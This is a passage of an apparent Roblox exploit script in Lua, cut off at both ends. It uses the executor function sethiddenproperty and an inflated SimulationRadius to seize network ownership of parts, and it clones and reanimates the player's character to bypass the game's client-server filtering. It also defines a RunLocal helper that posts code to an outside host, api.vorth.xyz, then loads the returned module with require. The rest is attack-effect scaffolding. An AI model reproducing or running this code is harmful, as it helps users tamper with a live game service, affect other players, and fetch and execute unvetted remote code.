	CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1
	return {AlignPos,AlignOri,AttachmentA,AttachmentB}
end

if _G.netted ~= true then
	_G.netted = true
	coroutine.wrap(function()
		settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
		settings().Physics.AllowSleep = false
		game:GetService(""RunService"").RenderStepped:Connect(function()
			game:FindFirstChildOfClass(""Players"").LocalPlayer.MaximumSimulationRadius=math.pow(math.huge,math.huge)
			sethiddenproperty(game:FindFirstChildOfClass(""Players"").LocalPlayer,""SimulationRadius"",math.huge*math.huge)
		end)
	end)()
end

game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""].Archivable = true
local hatnameclone = {}
for _,v in next, game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""]:GetChildren() do
	if v:IsA(""Accessory"") then
		if hatnameclone[v.Name] then
			if hatnameclone[v.Name] == ""s"" then
				hatnameclone[v.Name] = {}
			end
			table.insert(hatnameclone[v.Name],v)
		else
			hatnameclone[v.Name] = ""s""
		end
	end
end
for _,v in pairs(hatnameclone) do
	if type(v) == ""table"" then
		local num = 1
		for _,w in pairs(v) do
			w.Name = w.Name..num
			num = num + 1
		end
	end
end
hatnameclone = nil

local DeadChar = game:FindFirstChildOfClass(""Players"").LocalPlayer.Character

local fldr = Instance.new(""Folder"",game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""])
fldr.Name = ""DMYF""
local CloneChar = DeadChar:Clone()
local ANIMATIONHERE
if CloneChar:FindFirstChild(""Animate"") then
	ANIMATIONHERE = CloneChar:FindFirstChild(""Animate""):Clone()
	CloneChar:FindFirstChild(""Animate""):Destroy()
end
if CloneChar:FindFirstChildOfClass(""Folder"") then CloneChar:FindFirstChildOfClass(""Folder""):Destroy() end
if CloneChar.Torso:FindFirstChild(""Neck"") then
	local Clonessss = CloneChar.Torso:FindFirstChild(""Neck""):Clone()
	Clonessss.Part0 = nil
	Clonessss.Part1 = DeadChar.Head
	Clonessss.Parent = DeadChar.Torso
end
CloneChar.Parent = fldr
CloneChar.HumanoidRootPart.CFrame = DeadChar.HumanoidRootPart.CFrame
CloneChar.Humanoid.BreakJointsOnDeath = false
CloneChar.Name = ""non""
CloneChar.Humanoid.DisplayDistanceType = ""None""

for _,v in next, DeadChar:GetChildren() do
	if v:IsA(""Accessory"") then
		local topacc = false
		if v.Handle:FindFirstChildOfClass(""Weld"") then v.Handle:FindFirstChildOfClass(""Weld""):Destroy() end
		v.Handle.Massless = true
		v.Handle.CanCollide = false
		if v.Handle:FindFirstChildOfClass(""Attachment"") then
			local ath__ = v.Handle:FindFirstChildOfClass(""Attachment"")
			if ath__.Name == ""HatAttachment"" or ath__.Name == ""HairAttachment"" or ath__.Name == ""FaceFrontAttachment"" or ath__.Name == ""FaceCenterAttachment"" then
				topacc = ath__.Name
			end
		end
        local bv = Instance.new(""BodyVelocity"",v.Handle)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			if topacc then
				local allthings = SCIFIMOVIELOL(v.Handle,DeadChar.Torso,Vector3.new(0,1.5,0)+ (DeadChar.Head[topacc].Position + (v.Handle[topacc].Position*-1)),Vector3.new(0,0,0))
				local normaltop = allthings[1].Attachment1
				local alipos = allthings[1]
				local alirot = allthings[2]
				local p0 = v.Handle
				local p1 = DeadChar.Head
				alipos.Parent = CloneChar:FindFirstChild(v.Name).Handle
				alirot.Parent = CloneChar:FindFirstChild(v.Name).Handle
				while true do
					game:GetService(""RunService"").RenderStepped:wait()
					if HumanDied then break end
					coroutine.wrap(function()
						if alipos.Attachment1 == normaltop then
							p0.CFrame = p0.CFrame:lerp((((DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)) * p1[topacc].CFrame) * p0[topacc].CFrame:inverse()),1)
						else
							v.Handle.CFrame = v.Handle.CFrame:lerp(alipos.Attachment1.Parent.CFrame * CFrame.new(alipos.Attachment1.Position) * CFrame.Angles(math.rad(alipos.Attachment1.Rotation.X),math.rad(alipos.Attachment1.Rotation.Y),math.rad(alipos.Attachment1.Rotation.Z)),1)
						end
					end)()
				end
			else
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end)()
    end
end

local a = DeadChar.Torso
local b = DeadChar.HumanoidRootPart
local c = DeadChar.Humanoid
a.Parent = game:FindFirstChildOfClass(""Workspace"")
c.Parent = game:FindFirstChildOfClass(""Workspace"")
local told = a:Clone()
local told1 = c:Clone()
b[""RootJoint""].Part0 = told
b[""RootJoint""].Part1 = DeadChar.Head
a.Name = ""torso""
a.Neck:Destroy()
c.Name = ""Mizt Hub Best""
told.Parent = DeadChar
told1.Parent = DeadChar
DeadChar.PrimaryPart = told
told1.Health = 0
b:Destroy()
a.Parent = DeadChar
c.Parent = DeadChar
told:Destroy()
told1:Destroy()
a.Name = ""Torso""

if CloneChar.Head:FindFirstChildOfClass(""Decal"") then CloneChar.Head:FindFirstChildOfClass(""Decal"").Transparency = 1 end
if DeadChar:FindFirstChild(""Animate"") then DeadChar:FindFirstChild(""Animate""):Destroy() end

local Collider
function UnCollide()
    if HumanDied then Collider:Disconnect(); return end
    --[[for _,Parts in next, CloneChar:GetChildren() do
        if Parts:IsA(""BasePart"") then
            Parts.CanCollide = false 
        end 
    end]]
    for _,Parts in next, DeadChar:GetChildren() do
        if Parts:IsA(""BasePart"") then
        Parts.CanCollide = false
        end 
    end 
end
Collider = game:GetService(""RunService"").Stepped:Connect(UnCollide)

local resetBindable = Instance.new(""BindableEvent"")
resetBindable.Event:connect(function()
    game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", true)
	resetBindable:Destroy()
	HumanDied = true
    pcall(function()
		game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = DeadChar
		DeadChar.Head:Destroy()
		DeadChar:FindFirstChildOfClass(""Humanoid""):Destroy()
		game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
		if DeadChar:FindFirstChildOfClass(""Folder"") then DeadChar:FindFirstChildOfClass(""Folder""):Destroy() end
	end)
end)
game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", resetBindable)

coroutine.wrap(function()
    while true do
        game:GetService(""RunService"").RenderStepped:wait()
        if not CloneChar or not CloneChar:FindFirstChild(""Head"") or not CloneChar:FindFirstChildOfClass(""Humanoid"") or CloneChar:FindFirstChildOfClass(""Humanoid"").Health <= 0 and not DeadChar or not DeadChar:FindFirstChild(""Head"") or not DeadChar:FindFirstChildOfClass(""Humanoid"") or DeadChar:FindFirstChildOfClass(""Humanoid"").Health <= 0 then 
            HumanDied = true
            pcall(function()
				game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = DeadChar
				DeadChar.Head:Destroy()
				DeadChar:FindFirstChildOfClass(""Humanoid""):Destroy()
				game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
				if DeadChar:FindFirstChildOfClass(""Folder"") then DeadChar:FindFirstChildOfClass(""Folder""):Destroy() end
			end)
            if resetBindable then
                game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", true)
                resetBindable:Destroy()
            end
            break
        end		
    end
end)()


SCIFIMOVIELOL(DeadChar[""Head""],CloneChar[""Head""])
SCIFIMOVIELOL(DeadChar[""Torso""],CloneChar[""Torso""])
SCIFIMOVIELOL(DeadChar[""Left Arm""],CloneChar[""Left Arm""])
SCIFIMOVIELOL(DeadChar[""Right Arm""],CloneChar[""Right Arm""])
SCIFIMOVIELOL(DeadChar[""Left Leg""],CloneChar[""Left Leg""])
SCIFIMOVIELOL(DeadChar[""Right Leg""],CloneChar[""Right Leg""])

for _,v in pairs(DeadChar:GetChildren()) do
	if v:IsA(""BasePart"") and v.Name ~= ""Head"" then
		--[[local bv = Instance.new(""BodyVelocity"",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService(""RunService"").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = CloneChar[v.Name].CFrame
			end
		end)()]]
	elseif v:IsA(""BasePart"") and v.Name == ""Head"" then
		local bv = Instance.new(""BodyVelocity"",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService(""RunService"").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)
			end
		end)()
	end
end

for _,BodyParts in next, CloneChar:GetDescendants() do
if BodyParts:IsA(""BasePart"") or BodyParts:IsA(""Part"") then
BodyParts.Transparency = 1 end end
game:GetService(""RunService"").RenderStepped:wait()
game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
game:FindFirstChildOfClass(""Workspace""):FindFirstChildOfClass(""Camera"").CameraSubject = CloneChar.Humanoid

for _,v in next, DeadChar:GetChildren() do
	if v:IsA(""Accessory"") then
		if v.Handle:FindFirstChildOfClass(""Weld"") then v.Handle:FindFirstChildOfClass(""Weld""):Destroy() end
	end
end

if ANIMATIONHERE then ANIMATIONHERE.Parent = CloneChar end


--// Shortcut Variables \\--
local S = setmetatable({},{__index = function(s,i) return game:service(i) end})
local CF = {N=CFrame.new,A=CFrame.Angles,fEA=CFrame.fromEulerAnglesXYZ}
local C3 = {N=Color3.new,RGB=Color3.fromRGB,HSV=Color3.fromHSV,tHSV=Color3.toHSV}
local V3 = {N=Vector3.new,FNI=Vector3.FromNormalId,A=Vector3.FromAxis}
local M = {C=math.cos,R=math.rad,S=math.sin,P=math.pi,RNG=math.random,MRS=math.randomseed,H=math.huge,RRNG = function(min,max,div) return math.rad(math.random(min,max)/(div or 1)) end}
local R3 = {N=Region3.new}
local De = S.Debris
local WS = workspace
local Lght = S.Lighting
local RepS = S.ReplicatedStorage
local IN = Instance.new
local Plrs = S.Players

local Emit = IN(""ParticleEmitter"").Emit;

--// Initializing \\--
local Plr = Plrs.LocalPlayer
local Char = Plr.Character
local Hum = Char:FindFirstChildOfClass'Humanoid'
local RArm = Char[""Right Arm""]
local LArm = Char[""Left Arm""]
local RLeg = Char[""Right Leg""]
local LLeg = Char[""Left Leg""]	
local Root = Char:FindFirstChild'HumanoidRootPart'
local Torso = Char.Torso
local Head = Char.Head
local NeutralAnims = true
local Attack = false
local Debounces = {Debounces={}}
local Mouse = Plr:GetMouse()
local Hit = {}
local Sine = 0
local Change = 1

local Effects = IN(""Folder"",Char)
Effects.Name = ""Effects""


--// Debounce System \\--


function Debounces:New(name,cooldown)
	local aaaaa = {Usable=true,Cooldown=cooldown or 2,CoolingDown=false,LastUse=0}
	setmetatable(aaaaa,{__index = Debounces})
	Debounces.Debounces[name] = aaaaa
	return aaaaa
end

function Debounces:Use(overrideUsable)
	assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,""Expected ':' not '.' calling member function Use"")
	if(self.Usable or overrideUsable)then
		self.Usable = false
		self.CoolingDown = true
		local LastUse = time()
		self.LastUse = LastUse
		delay(self.Cooldown or 2,function()
			if(self.LastUse == LastUse)then
				self.CoolingDown = false
				self.Usable = true
			end
		end)
	end
end

function Debounces:Get(name)
	assert(typeof(name) == 'string',(""bad argument #1 to 'get' (string expected, got %s)""):format(typeof(name) == nil and ""no value"" or typeof(name)))
	for i,v in next, Debounces.Debounces do
		if(i == name)then
			return v;
		end
	end
end

function Debounces:GetProgressPercentage()
	assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,""Expected ':' not '.' calling member function Use"")
	if(self.CoolingDown and not self.Usable)then
		return math.max(
			math.floor(
				(
					(time()-self.LastUse)/self.Cooldown or 2
				)*100
			)
		)
	else
		return 100
	end
end

--// Instance Creation Functions \\--

function Sound(parent,id,pitch,volume,looped,effect,autoPlay)
	local Sound = IN(""Sound"")
	Sound.SoundId = ""rbxassetid://"".. tostring(id or 0)
	Sound.Pitch = pitch or 1
	Sound.Volume = volume or 1
	Sound.Looped = looped or false
	if(autoPlay)then
		coroutine.wrap(function()
			repeat wait() until Sound.IsLoaded
			Sound.Playing = autoPlay or false
		end)()
	end
	if(not looped and effect)then
		Sound.Stopped:connect(function()
			Sound.Volume = 0
			Sound:destroy()
		end)
	elseif(effect)then
		warn(""Sound can't be looped and a sound effect!"")
	end
	Sound.Parent =parent or Torso
	return Sound
end
function Part(parent,color,material,size,cframe,anchored,cancollide)
	local part = IN(""Part"")
	part.Parent = parent or Char
	part[typeof(color) == 'BrickColor' and 'BrickColor' or 'Color'] = color or C3.N(0,0,0)
	part.Material = material or Enum.Material.SmoothPlastic
	part.TopSurface,part.BottomSurface=10,10
	part.Size = size or V3.N(1,1,1)
	part.CFrame = cframe or CF.N(0,0,0)
	part.CanCollide = cancollide or false
	part.Anchored = anchored or false
	return part
end

function Weld(part0,part1,c0,c1)
	local weld = IN(""Weld"")
	weld.Parent = part0
	weld.Part0 = part0
	weld.Part1 = part1
	weld.C0 = c0 or CF.N()
	weld.C1 = c1 or CF.N()
	return weld
end

function Mesh(parent,meshtype,meshid,textid,scale,offset)
	local part = IN(""SpecialMesh"")
	part.MeshId = meshid or """"
	part.TextureId = textid or """"
	part.Scale = scale or V3.N(1,1,1)
	part.Offset = offset or V3.N(0,0,0)
	part.MeshType = meshtype or Enum.MeshType.Sphere
	part.Parent = parent
	return part
end

NewInstance = function(instance,parent,properties)
	local inst = Instance.new(instance)
	inst.Parent = parent
	if(properties)then
		for i,v in next, properties do
			pcall(function() inst[i] = v end)
		end	
	end
	return inst;
end

function Clone(instance,parent,properties)
	local inst = instance:Clone()
	inst.Parent = parent
	if(properties)then
		for i,v in next, properties do
			pcall(function() inst[i] = v end)
		end
	end
	return inst;
end

function SoundPart(id,pitch,volume,looped,effect,autoPlay,cf)
	local soundPart = NewInstance(""Part"",Effects,{Transparency=1,CFrame=cf or Torso.CFrame,Anchored=true,CanCollide=false,Size=V3.N()})
	local Sound = IN(""Sound"")
	Sound.SoundId = ""rbxassetid://"".. tostring(id or 0)
	Sound.Pitch = pitch or 1
	Sound.Volume = volume or 1
	Sound.Looped = looped or false
	if(autoPlay)then
		coroutine.wrap(function()
			repeat wait() until Sound.IsLoaded
			Sound.Playing = autoPlay or false
		end)()
	end
	if(not looped and effect)then
		Sound.Stopped:connect(function()
			Sound.Volume = 0
			soundPart:destroy()
		end)
	elseif(effect)then
		warn(""Sound can't be looped and a sound effect!"")
	end
	Sound.Parent = soundPart
	return Sound
end


--// Extended ROBLOX tables \\--
local Instance = setmetatable({ClearChildrenOfClass = function(where,class,recursive) local children = (recursive and where:GetDescendants() or where:GetChildren()) for _,v in next, children do if(v:IsA(class))then v:destroy();end;end;end},{__index = Instance})
--// Require stuff \\--
function CamShake(who,times,intense,origin) 
	coroutine.wrap(function()
		if(script:FindFirstChild'CamShake')then
			local cam = script.CamShake:Clone()
			cam:WaitForChild'intensity'.Value = intense
			cam:WaitForChild'times'.Value = times
			
	 		if(origin)then NewInstance((typeof(origin) == 'Instance' and ""ObjectValue"" or typeof(origin) == 'Vector3' and 'Vector3Value'),cam,{Name='origin',Value=origin}) end
			cam.Parent = who
			wait()
			cam.Disabled = false
		elseif(who == Plr or who == Char)then
			local intensity = intense
			local cam = workspace.CurrentCamera
			for i = 1, times do
				local camDistFromOrigin
				if(typeof(origin) == 'Instance' and origin:IsA'BasePart')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin.Position).magnitude )/25
				elseif(typeof(origin) == 'Vector3')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin).magnitude )/25
				end
				if(camDistFromOrigin)then
					intensity = math.min(intense, math.floor(intense/camDistFromOrigin))
				end
				cam.CFrame = cam.CFrame:lerp(cam.CFrame*CFrame.new(math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100)*CFrame.Angles(math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100)),.4)
				swait()
			end
		end
	end)()
end

function CamShakeAll(times,intense,origin)
	for _,v in next, Plrs:players() do
		CamShake(v:FindFirstChildOfClass'PlayerGui' or v:FindFirstChildOfClass'Backpack' or v.Character,times,intense,origin)
	end
end

function ServerScript(code)
	if(script:FindFirstChild'Loadstring')then
		local load = script.Loadstring:Clone()
		load:WaitForChild'Sauce'.Value = code
		load.Disabled = false
		load.Parent = workspace
	elseif(NS and typeof(NS) == 'function')then
		NS(code,workspace)
	else
		warn(""no serverscripts lol"")
	end	
end

function RunLocal(where,code)
	ServerScript([[
		wait()
		script.Parent=nil
		if(not _G.Http)then _G.Http = game:service'HttpService' end
		
		local Http = _G.Http or game:service'HttpService'
		
		local source = ]]..""[[""..code..""]]""..[[
		local link = ""https://api.vorth.xyz/R_API/R.UPLOAD/NEW_LOCAL.php""
		local asd = Http:PostAsync(link,source)
		repeat wait() until asd and Http:JSONDecode(asd) and Http:JSONDecode(asd).Result and Http:JSONDecode(asd).Result.Require_ID
		local ID = Http:JSONDecode(asd).Result.Require_ID
		local vs = require(ID).VORTH_SCRIPT
		vs.Parent = game.]]..where:GetFullName()
	)
end

--// Customization \\--

local Frame_Speed = 60;
local WalkSpeed = 16
local DamageColor = BrickColor.new'White'

local MagicCircles = {
	Default = {Color=C3.N(1,1,1),Texture1=0,Texture2=0},
	OrangeWarPheonix = {EffectColor=BrickColor.new'Deep orange'.Color,Color=C3.N(.9,.9,.9),Texture1=623153986,Texture2=623153990},
	BlueWarPheonix = {EffectColor=BrickColor.new'Teal'.Color,Color=C3.N(.9,.9,.9),Texture1=462499935,Texture2=462499970},
	Plasma = {Color=C3.N(0.70588235294118,0,0.8),Texture1=415906687,Texture2=415906702},
	Water = {Color=C3.RGB(33, 84, 185),Texture1=408441330,Texture2=408441353},
	Earth = {Color=C3.RGB(86, 36, 36),Texture1=394253616,Texture2=394253651},
	Wind = {Color=C3.N(.8,.8,.8),Texture1=376006317,Texture2=376006346},
	Poseidon = {Color=C3.RGB(71, 99, 130),Texture1=346727970,Texture2=346727994},
	AetherLightning = {Color=C3.RGB(23, 255, 197),Texture1=348320016,Texture2=348320030},
	Light = {Color=C3.N(1,1,0),Texture1=343192085,Texture2=343192112},
	Fire = {Color=C3.N(1,0,0),EffectColor=BrickColor.new'Bright red'.Color,Texture1=313945544,Texture2=313945673},
	Lightning = {Color=C3.N(0,1,1),Texture1=314842290,Texture2=314842440},
	GasterBlaster = {Color=C3.N(1,1,1),Texture1=331948662,Texture2=331948662}
}

local MagicVariant = MagicCircles.GasterBlaster --[[ You can change this for a different element
Example: 

Changing MagicCircles.GasterBlaster to MagicCircles.Light

would make it a Light Element
]]

--// Stop animations \\--
for _,v in next, Hum:GetPlayingAnimationTracks() do
	v:Stop();
end

pcall(game.Destroy,Char:FindFirstChild'Animate')
pcall(game.Destroy,Hum:FindFirstChild'Animator')

--// Joints \\--

local LS = NewInstance('Motor',Char,{Part0=Torso,Part1=LArm,C0 = CF.N(-1.5,0.5,0),C1 = CF.N(0,.5,0)})
local RS = NewInstance('Motor',Char,{Part0=Torso,Part1=RArm,C0 = CF.N(1.5,0.5,0),C1 = CF.N(0,.5,0)})
local NK = NewInstance('Motor',Char,{Part0=Torso,Part1=Head,C0 = CF.N(0,1.5,0)})
local LH = NewInstance('Motor',Char,{Part0=Torso,Part1=LLeg,C0 = CF.N(-.5,-1,0),C1 = CF.N(0,1,0)})
local RH = NewInstance('Motor',Char,{Part0=Torso,Part1=RLeg,C0 = CF.N(.5,-1,0),C1 = CF.N(0,1,0)})
local RJ = NewInstance('Motor',Char,{Part0=Root,Part1=Torso})

local LSC0 = LS.C0
local RSC0 = RS.C0
local NKC0 = NK.C0
local LHC0 = LH.C0
local RHC0 = RH.C0
local RJC0 = RJ.C0

--// Artificial HB \\--

local ArtificialHB = IN(""BindableEvent"", script)
ArtificialHB.Name = ""Heartbeat""

script:WaitForChild(""Heartbeat"")

local tf = 0
local allowframeloss = false
local tossremainder = false
local lastframe = tick()
local frame = 1/Frame_Speed
ArtificialHB:Fire()

game:GetService(""RunService"").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				ArtificialHB:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function swait(num)
	if num == 0 or num == nil then
		ArtificialHB.Event:wait()
	else
		for i = 0, num do
			ArtificialHB.Event:wait()
		end
	end
end


--// Effect Function(s) \\--

function NumSeq(...)
	local tab = {...}
	local Sequence = {}
	for _,v in next, tab do
		table.insert(Sequence,NumberSequenceKeypoint.new(unpack(v)))
	end
	if(tab[#tab][1] ~= 1)then
		local final = tab[#tab]
		table.insert(Sequence,NumberSequenceKeypoint.new(1,final[2],final[3]))
	end
	return NumberSequence.new(Sequence)
end

local DefaultRingParticle = IN(""ParticleEmitter"")
DefaultRingParticle.Name = 'RingEmit'
DefaultRingParticle.LightEmission = 1
DefaultRingParticle.Size = NumSeq({0,0},{.7,6.28},{.8,5.03},{1,2.9})
DefaultRingParticle.Texture = ""rbxassetid://313951123""
DefaultRingParticle.Transparency = NumberSequence.new(0,1)
DefaultRingParticle.ZOffset = 1
DefaultRingParticle.Drag = 0
DefaultRingParticle.Acceleration = V3.N()
DefaultRingParticle.LockedToPart = true
DefaultRingParticle.Enabled = false
DefaultRingParticle.Lifetime = NumberRange.new(.6,.6)
DefaultRingParticle.Rate = 5
DefaultRingParticle.Rotation = NumberRange.new(0,0)
DefaultRingParticle.RotSpeed = NumberRange.new(0,0)
DefaultRingParticle.Speed = NumberRange.new(0,0)
DefaultRingParticle.SpreadAngle = Vector2.new(0,0)

function MagicCircle(Data)
	local Variant = Data.Variant or MagicCircles.Default;
	
	local Size = Data.Size or 10;
	local Pos = Data.Pos*CF.A(M.R(-90),M.R(-90),0) or Torso.CFrame*CF.A(M.R(-90),M.R(-90),0);
	local GrowTime = Data.Time or 1;
	
	local WeldData = Data.Weld or false;
	
	
	local Color = Variant.Color or C3.N(.9,.9,.0)
	
	local CreationParticle = Data.CreationParticle or DefaultRingParticle;
	
	
	local Circle = Part(Effects,BrickColor.new'Maroon',Enum.Material.SmoothPlastic,V3.N(.05,.05,.05),Pos,true,false)
	local CircleM = NewInstance(""BlockMesh"",Circle,{Scale=V3.N()})
	
	
	local Emitter = DefaultRingParticle:Clone();
	Emitter.Parent = Circle
	Emitter.Color = ColorSequence.new(Variant.Color)
	
	local Top = IN(""Decal"",Circle)
	Top.Texture = ""rbxassetid://""..Variant.Texture1
	Top.Face = Enum.NormalId.Top
	
	local Btm = IN(""Decal"",Circle)
	Btm.Texture = ""rbxassetid://""..Variant.Texture2
	Btm.Face = Enum.NormalId.Bottom
	
	if(WeldData)then
		Circle.Anchored = false
		Weld(WeldData,Circle,Pos,CF.N())
	end
	local GrowFrames = GrowTime * Frame_Speed
	print(GrowFrames)
	--Size*20,0,Size*20
	Circle.Transparency = 1
	local GrownEvent = Instance.new(""BindableEvent"",Circle)
	coroutine.wrap(function()
		
		Emit(Emitter,5)
		local End = Size*20
		local grow = End/GrowFrames
		for i = 1, GrowFrames+1 do
			local aa = math.min(CircleM.Scale.x + grow,End)
			if(aa >= End)then break end
			CircleM.Scale = V3.N(aa,0,aa)
			swait()
		end
		CircleM.Scale = V3.N(End,0,End)
		GrownEvent:Fire()
		
	end)()
	
	local Table = {
		Circle = Circle,
		Mesh = CircleM,
		Grow = function(size)
			CircleM.Scale = CircleM.Scale + V3.N(size*20,0,size*20)
		end,
		Destroy = function(timer)
			coroutine.wrap(function()
				if(not timer)then timer = 1 end
				Tween(CircleM,{Scale=V3.N(0,0,0)},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				Tween(Top,{Transparency=1},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				Tween(Btm,{Transparency=1},timer,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
				S.Debris:AddItem(Circle,timer+1)
			end)()
		end,
		Grown = GrownEvent.Event
	}
		
	return Table;
end

function Bezier(startpos, pos2, pos3, endpos, t)
	local A = startpos:lerp(pos2, t)
	local B  = pos2:lerp(pos3, t)
	local C = pos3:lerp(endpos, t)
	local lerp1 = A:lerp(B, t)
	local lerp2 = B:lerp(C, t)
	local cubic = lerp1:lerp(lerp2, t)
	return cubic
end

function SphereFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function BlastFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		Mesh={MeshType=Enum.MeshType.FileMesh,MeshId='rbxassetid://20329976'},
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function BlockFX(duration,color,scale,pos,endScale,increment)
	return Effect{
		Frames=duration,
		Effect='ResizeAndFade',
		Color=color,
		Size=scale,
		CFrame=pos,
		FXSettings={
			EndSize=endScale,
			EndIsIncrement=increment
		}
	}
end

function ShootBullet(data)
	--ShootBullet{Size=V3.N(3,3,3),Shape='Ball',Frames=160,Origin=data.Circle.CFrame,Speed=10}
	local Size = data.Size or V3.N(2,2,2)
	local Color = data.Color or MagicVariant.EffectColor or MagicVariant.Color
	local StudsPerFrame = data.Speed or 10
	local Shape = data.Shape or 'Ball'
	local Frames = data.Frames or 160
	local Pos = data.Origin or Torso.CFrame
	local Direction = data.Direction or Mouse.Hit
	local Material = data.Material or Enum.Material.Neon
	local OnHit = data.HitFunction or function(hit,pos)
		Effect{
			Effect='ResizeAndFade',
			Color=Color,
			Size=V3.N(10,10,10),
			Mesh={MeshType=Enum.MeshType.Sphere},
			CFrame=CF.N(pos),
			FXSettings={
				EndSize=V3.N(.05,.05,.05),
				EndIsIncrement=true
			}
		}
		for i = 1, 5 do
			local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
			Effect{
				Effect='Fade',
				Frames=65,
				Size=V3.N(5,5,10),
				CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-10).p,pos),
				Mesh = {MeshType=Enum.MeshType.Sphere},
				Material=Enum.Material.Neon,
				Color=Color,
				MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
			}	
		end
		AOEDamage(pos,10,15,30,0,'Normal',10,4)
	end	
	
	local Bullet = Part(Effects,Color,Material,Size,Pos,true,false)
	local BMesh = Mesh(Bullet,Enum.MeshType.Brick,"""","""",V3.N(1,1,1),V3.N())
	if(Shape == 'Ball')then
		BMesh.MeshType = Enum.MeshType.Sphere
	elseif(Shape == 'Head')then
		BMesh.MeshType = Enum.MeshType.Head
	elseif(Shape == 'Cylinder')then
		BMesh.MeshType = Enum.MeshType.Cylinder
	end
	
	coroutine.wrap(function()
		for i = 1, Frames+1 do
			local hit,pos,norm,dist = CastRay(Bullet.CFrame.p,CF.N(Bullet.CFrame.p,Direction.p)*CF.N(0,0,-StudsPerFrame).p,StudsPerFrame)
			if(hit)then
				OnHit(hit,pos,norm,dist)
				break;
			else
				Bullet.CFrame = CF.N(Bullet.CFrame.p,Direction.p)*CF.N(0,0,-StudsPerFrame)
			end
			swait()
		end
		Bullet:destroy()
	end)()
	
end

function Zap(data)
	local sCF,eCF = data.StartCFrame,data.EndCFrame
	assert(sCF,""You need a start CFrame!"")
	assert(eCF,""You need an end CFrame!"")
	local parts = data.PartCount or 15
	local zapRot = data.ZapRotation or {-5,5}
	local startThick = data.StartSize or 3;
	local endThick = data.EndSize or startThick/2;
	local color = data.Color or BrickColor.new'Electric blue'
	local delay = data.Delay or 35
	local delayInc = data.DelayInc or 0
	local lastLightning;
	local MagZ = (sCF.p - eCF.p).magnitude
	local thick = startThick
	local inc = (startThick/parts)-(endThick/parts)
	
	for i = 1, parts do
		local pos = sCF.p
		if(lastLightning)then
			pos = lastLightning.CFrame*CF.N(0,0,MagZ/parts/2).p
		end
		delay = delay + delayInc
		local zapPart = Part(Effects,color,Enum.Material.Neon,V3.N(thick,thick,MagZ/parts),CF.N(pos),true,false)
		local posie = CF.N(pos,eCF.p)*CF.N(0,0,MagZ/parts).p+V3.N(M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)),M.RNG(unpack(zapRot)))
		if(parts == i)then
			local MagZ = (pos-eCF.p).magnitude
			zapPart.Size = V3.N(endThick,endThick,MagZ)
			zapPart.CFrame = CF.N(pos, eCF.p)*CF.N(0,0,-MagZ/2)
			Effect{Effect='ResizeAndFade',Size=V3.N(thick,thick,thick),CFrame=eCF*CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180)),Color=color,Frames=delay*2,FXSettings={EndSize=V3.N(thick*8,thick*8,thick*8)}}
		else
			zapPart.CFrame = CF.N(pos,posie)*CF.N(0,0,MagZ/parts/2)
		end
		
		lastLightning = zapPart
		Effect{Effect='Fade',Manual=zapPart,Frames=delay}
		
		thick=thick-inc
		
	end
end

function Zap2(data)
	local Color = data.Color or BrickColor.new'Electric blue'
	local StartPos = data.Start or Torso.Position
	local EndPos = data.End or Mouse.Hit.p
	local SegLength = data.SegL or 2
	local Thicc = data.Thickness or 0.5
	local Fades = data.Fade or 45
	local Parent = data.Parent or Effects
	local MaxD = data.MaxDist or 200
	local Branch = data.Branches or false
	local Material = data.Material or Enum.Material.Neon
	local Raycasts = data.Raycasts or false
	local Offset = data.Offset or {0,360}
	local AddMesh = (data.Mesh == nil and true or data.Mesh)
